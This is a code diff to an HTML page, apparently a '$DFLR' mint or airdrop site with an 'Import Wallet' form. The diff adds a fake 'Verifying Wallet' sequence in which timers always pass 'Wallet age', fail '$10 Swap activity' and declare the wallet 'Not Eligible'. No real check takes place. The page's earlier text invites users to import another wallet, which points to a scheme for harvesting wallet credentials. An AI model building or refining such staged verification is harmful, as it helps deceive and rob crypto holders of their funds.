@@ -156,12 +156,139 @@
     .btn-submit:hover:not(:disabled) { transform: translate(-1px, -1px); box-shadow: 4px 4px 0 #1a4a1a; background: #1a4a1a; }
     .btn-submit:disabled { opacity: 0.4; cursor: not-allowed; box-shadow: none; }
 
-    .success-state { display: none; text-align: center; padding: 1.5rem 0; }
-    .success-state.show { display: block; }
-    .success-icon { width: 68px; height: 68px; background: #fde8e8; border: 2px solid #c0392b; border-radius: 4px; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.5rem; font-size: 26px; color: #c0392b; font-weight: 800; font-family: 'Space Mono', monospace; animation: pop-in 0.4s cubic-bezier(0.22,1,0.36,1) both; }
-    @keyframes pop-in { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-    .success-state h3 { font-family: 'Space Mono', monospace; font-size: 1.2rem; font-weight: 700; margin-bottom: 0.5rem; color: #c0392b; }
-    .success-state p { color: var(--muted2); font-size: 13px; line-height: 1.6; }
+    .success-state {
+  display: none;
+  text-align: center;
+  padding: 1.5rem 0;
+}
+
+.success-state.show {
+  display: block;
+}
+
+/* Verification icon */
+.verify-icon {
+  width: 68px;
+  height: 68px;
+  background: #f4faf6;
+  border: 2px solid #0b7a3e;
+  border-radius: 4px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 1.5rem;
+}
+
+.loader {
+  width: 25px;
+  height: 25px;
+  border: 3px solid #cde8d8;
+  border-top-color: #0b7a3e;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+/* Title */
+.success-state h3 {
+  font-family: 'Space Mono', monospace;
+  font-size: 1.2rem;
+  font-weight: 700;
+  margin-bottom: 1.2rem;
+  color: #0b7a3e;
+}
+
+/* Verification rows */
+.verification-list {
+  width: 100%;
+  max-width: 390px;
+  margin: 0 auto 1.2rem;
+}
+
+.verify-item {
+  display: flex;
+  align-items: center;
+  gap: 9px;
+  padding: 9px 0;
+  font-size: 13px;
+  color: #25382d;
+  font-family: 'Space Mono', monospace;
+  text-align: left;
+}
+
+.verify-item .status-text {
+  margin-left: auto;
+  font-size: 11px;
+  color: #8a9990;
+}
+
+/* Circle loading */
+.check-icon {
+  width: 17px;
+  height: 17px;
+  border: 2px solid #b9c9bf;
+  border-radius: 50%;
+  flex-shrink: 0;
+  position: relative;
+}
+
+.verify-item.checking .check-icon {
+  border-color: #0b7a3e;
+  border-top-color: transparent;
+  animation: spin 0.7s linear infinite;
+}
+
+/* Verified */
+.verify-item.verified .check-icon {
+  background: #16b955;
+  border-color: #16b955;
+}
+
+.verify-item.verified .check-icon::after {
+  content: "✓";
+  position: absolute;
+  color: white;
+  font-size: 11px;
+  font-weight: 800;
+  left: 2px;
+  top: -2px;
+}
+
+.verify-item.verified .status-text {
+  color: #16a34a;
+}
+
+/* Failed */
+.verify-item.failed .check-icon {
+  background: #df2b1f;
+  border-color: #df2b1f;
+}
+
+.verify-item.failed .check-icon::after {
+  content: "×";
+  position: absolute;
+  color: white;
+  font-size: 15px;
+  font-weight: 800;
+  left: 2px;
+  top: -4px;
+}
+
+.verify-item.failed .status-text {
+  color: #d52b20;
+}
+
+.success-state p {
+  color: var(--muted2);
+  font-size: 13px;
+  line-height: 1.6;
+  margin-top: 8px;
+}
 
     .toast { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%) translateY(24px); background: #fff; border: 2px solid #c0392b; border-radius: 4px; padding: 12px 24px; font-size: 13px; font-weight: 700; color: #c0392b; display: flex; align-items: center; gap: 10px; opacity: 0; transition: all 0.35s cubic-bezier(0.22,1,0.36,1); z-index: 300; white-space: nowrap; font-family: 'Space Mono', monospace; box-shadow: 3px 3px 0 #c0392b; }
     .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
@@ -296,12 +423,34 @@
       </div>
 
       <div class="success-state" id="successState">
-        <div class="success-icon">✕</div>
-        <h3>Not Eligible</h3>
-        <p>Your wallet didn't meet the requirements. Refresh the page and try to import another wallet.</p>
-      </div>
-    </div>
+
+  <div class="verify-icon" id="verifyIcon">
+    <div class="loader"></div>
   </div>
+
+  <h3 id="verifyTitle">Verifying Wallet</h3>
+
+  <div class="verification-list" id="verificationList">
+
+    <div class="verify-item pending" id="walletAgeCheck">
+      <span class="check-icon"></span>
+      <span>Wallet age</span>
+      <span class="status-text">Checking...</span>
+    </div>
+
+    <div class="verify-item pending" id="swapCheck">
+      <span class="check-icon"></span>
+      <span>$10 Swap activity</span>
+      <span class="status-text">Waiting...</span>
+    </div>
+
+  </div>
+
+  <p id="verifyMessage">
+    Please wait while we verify your wallet...
+  </p>
+
+</div>
 
   <div class="toast" id="toast">
     <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
@@ -309,7 +458,71 @@
   </div>
 
   <script>
+    
+function showVerificationDemo() {
+  const state = document.getElementById('successState');
+  const icon = document.getElementById('verifyIcon');
+  const title = document.getElementById('verifyTitle');
+  const message = document.getElementById('verifyMessage');
 
+  const walletAge = document.getElementById('walletAgeCheck');
+  const swap = document.getElementById('swapCheck');
+
+  // Reset
+  icon.innerHTML = '<div class="loader"></div>';
+  icon.style.background = '#f4faf6';
+  icon.style.borderColor = '#0b7a3e';
+
+  title.textContent = 'Verifying Wallet';
+  title.style.color = '#0b7a3e';
+
+  message.textContent =
+    'Please wait while we verify your wallet...';
+
+  walletAge.className = 'verify-item checking';
+  walletAge.querySelector('.status-text').textContent = 'Checking...';
+
+  swap.className = 'verify-item pending';
+  swap.querySelector('.status-text').textContent = 'Waiting...';
+
+  state.classList.add('show');
+
+  // Step 1 — Wallet age
+  setTimeout(() => {
+    walletAge.className = 'verify-item verified';
+    walletAge.querySelector('.status-text').textContent = 'Verified';
+
+    // Start swap verification
+    swap.className = 'verify-item checking';
+    swap.querySelector('.status-text').textContent = 'Checking...';
+
+  }, 1800);
+
+  // Step 2 — Swap activity
+  setTimeout(() => {
+    swap.className = 'verify-item failed';
+    swap.querySelector('.status-text').textContent = 'Not Verified';
+
+  }, 3600);
+
+  // Final result
+  setTimeout(() => {
+    icon.innerHTML = '×';
+    icon.style.background = '#fde8e8';
+    icon.style.borderColor = '#c0392b';
+    icon.style.color = '#c0392b';
+    icon.style.fontSize = '32px';
+    icon.style.fontFamily = "'Space Mono', monospace";
+    icon.style.fontWeight = '800';
+
+    title.textContent = 'Not Eligible';
+    title.style.color = '#c0392b';
+
+    message.innerHTML =
+      'Please complete all requirements to mint $DFLR';
+
+  }, 4200);
+}
     
     function Scroll() {
       const target = document.getElementById('targetScroll');
@@ -418,9 +631,7 @@
         btn.disabled    = false;
         btn.textContent = 'Import Wallet';
         document.getElementById('formState').style.display = 'none';
-        document.getElementById('successState').classList.add('show');
-        showToast();
-        setTimeout(closeModal, 8000);
+showVerificationDemo();
       }
     }
 
